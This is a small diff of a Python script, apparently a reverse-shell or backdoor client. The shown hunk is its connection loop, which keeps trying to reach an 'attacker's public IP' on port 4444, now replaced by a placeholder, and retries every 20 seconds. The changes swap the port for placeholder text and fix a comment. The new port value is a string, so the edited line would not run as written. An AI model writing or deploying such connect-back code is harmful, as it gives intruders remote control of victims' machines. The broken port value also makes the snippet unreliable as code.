@@ -46,10 +46,10 @@ def main():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(("IP", 4444))  # Replace with attacker's public IP and port
+            s.connect(("IP", "port number"))  # Replace with attacker's public IP and port
             break
         except socket.error:
-            time.sleep(20)  # Wait for 10 seconds before retrying
+            time.sleep(20)  # Wait for 20 seconds before retrying
             print("waiting for response")
 
     while True:
